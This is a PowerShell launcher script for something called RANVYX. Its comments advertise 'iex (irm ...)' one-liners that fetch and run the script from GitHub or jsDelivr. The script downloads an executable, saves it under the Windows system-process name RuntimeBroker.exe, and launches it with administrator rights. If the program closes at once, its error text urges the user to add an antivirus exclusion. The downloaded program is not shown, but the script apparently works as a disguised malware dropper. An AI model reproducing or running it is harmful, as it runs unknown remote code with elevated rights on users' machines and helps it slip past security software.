# RANVYX launcher - works with:
#   powershell -File .\RANVYX.ps1
#   iex (irm 'https://cdn.jsdelivr.net/gh/lubyralph6-maker/RANVYX.EXE@main/RANVYX.ps1')
#   iex (irm 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RANVYX.ps1')

$ErrorActionPreference = 'Stop'

$exeName = 'RuntimeBroker.exe'
$installDir = Join-Path $env:LOCALAPPDATA 'RANVYX'
$exePath = Join-Path $installDir $exeName
$exeUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RuntimeBroker.exe'
$webUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) RANVYX-Launcher/1.0'

function Write-Status([string]$Text, [string]$Color = 'White') {
    Write-Host $Text -ForegroundColor $Color
}

function Get-LocalExeNearScript {
    $root = $PSScriptRoot
    if ([string]::IsNullOrWhiteSpace($root)) {
        return $null
    }

    $candidates = @(
        (Join-Path $root $exeName),
        (Join-Path $root 'RANVYX.exe')
    )

    foreach ($candidate in $candidates) {
        if (Test-Path -LiteralPath $candidate) {
            return $candidate
        }
    }

    return $null
}

function Invoke-DownloadWithRetry {
    param(
        [Parameter(Mandatory = $true)][string]$Uri,
        [Parameter(Mandatory = $true)][string]$OutFile,
        [int]$MaxRetries = 6
    )

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $headers = @{ 'User-Agent' = $webUserAgent }

    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            Invoke-WebRequest -Uri $Uri -OutFile $OutFile -UseBasicParsing -Headers $headers
            return
        }
        catch {
            $statusCode = $null
            if ($null -ne $_.Exception.Response) {
                $statusCode = [int]$_.Exception.Response.StatusCode
            }

            if ($statusCode -eq 429 -and $attempt -lt $MaxRetries) {
                $waitSeconds = [Math]::Min(90, [Math]::Pow(2, $attempt))
                Write-Status "GitHub rate limit (429). Retry in ${waitSeconds}s... ($attempt/$MaxRetries)" Yellow
                Start-Sleep -Seconds $waitSeconds
                continue
            }

            throw
        }
    }
}

function Get-CachedOrDownloadedExe {
    if (-not (Test-Path -LiteralPath $installDir)) {
        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    }

    if (Test-Path -LiteralPath $exePath) {
        Write-Status "Using cached: $exePath" Green
        return $exePath
    }

    Write-Status "Downloading: $exeUrl" Cyan
    Invoke-DownloadWithRetry -Uri $exeUrl -OutFile $exePath
    Write-Status 'Downloaded' Green

    if (-not (Test-Path -LiteralPath $exePath)) {
        throw 'Download failed - RuntimeBroker.exe not found after download.'
    }

    return $exePath
}

function Resolve-ExePath {
    $local = Get-LocalExeNearScript
    if ($null -ne $local) {
        return $local
    }
    return Get-CachedOrDownloadedExe
}

try {
    $targetExe = Resolve-ExePath
    if ([string]::IsNullOrWhiteSpace($targetExe)) {
        throw 'Could not resolve RANVYX executable path.'
    }

    Write-Status "Using: $targetExe" Green
    Write-Status 'Starting RANVYX (Administrator)...' Cyan

    $proc = Start-Process -FilePath $targetExe -Verb RunAs -PassThru
    if ($null -eq $proc) {
        throw 'Start-Process returned null.'
    }

    Start-Sleep -Seconds 2
    if ($proc.HasExited) {
        throw "RANVYX closed immediately (exit $($proc.ExitCode)). Install VC++ x64 Redistributable and add antivirus exclusion."
    }

    Write-Status 'RANVYX is running.' Green
    Write-Status 'Finished' Green
}
catch {
    Write-Status "Error: $($_.Exception.Message)" Red
    Write-Status 'Fix: upload RuntimeBroker.exe to GitHub, or copy exe + ps1 in same folder.' Yellow
    Write-Status 'Tip: use jsDelivr if raw GitHub returns 429:' Yellow
    Write-Status "  iex (irm 'https://cdn.jsdelivr.net/gh/lubyralph6-maker/RANVYX.EXE@main/RANVYX.ps1')" Yellow
}

Write-Host ''
Read-Host 'Press Enter to close'
